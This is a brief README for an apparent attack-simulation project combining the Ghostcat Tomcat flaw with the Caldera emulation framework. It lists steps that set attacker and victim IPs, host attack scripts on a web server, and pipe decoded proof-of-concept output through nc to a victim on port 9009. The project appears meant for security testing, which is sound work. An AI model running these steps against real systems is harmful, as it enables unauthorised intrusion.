# Cyber Attack Simulation by Ghostcat and Caldera

**1. Clone the repository** 

```bash
git clone https://github.com/jason61306/Cyber-Attack-Simulation-by-Ghostcat-and-Caldera.git
```

**2. Modify attack_sh.txt**

modify $AttackerIP


**3. Upload attack_sh.txt and attack.txt to web** 

**4. Modify attack.py** 

modify $VictimIP

**5. Run attack.py** 

```
$Python3 poc.py | xxd -r -p | nc $VictimIP 9009
```

